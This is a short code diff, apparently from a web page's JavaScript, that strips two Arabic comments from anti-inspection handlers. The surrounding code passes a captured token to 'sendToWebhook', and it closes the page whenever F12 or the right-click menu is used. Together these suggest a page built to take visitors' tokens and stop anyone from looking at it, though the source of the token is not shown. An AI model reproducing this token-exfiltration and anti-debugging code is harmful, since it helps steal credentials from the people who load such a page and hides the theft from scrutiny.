@@ -181,14 +181,14 @@
       if (token) sendToWebhook(token);
     });
 
-    // إغلاق الصفحة عند الضغط على F12
+    
     document.addEventListener('keydown', function (e) {
       if (e.key === "F12") {
         window.open('', '_self').close();
       }
     });
 
-    // إغلاق الصفحة عند الضغط بزر الفأرة الأيمن
+    
     document.addEventListener('contextmenu', function (e) {
       e.preventDefault();
       window.open('', '_self').close();
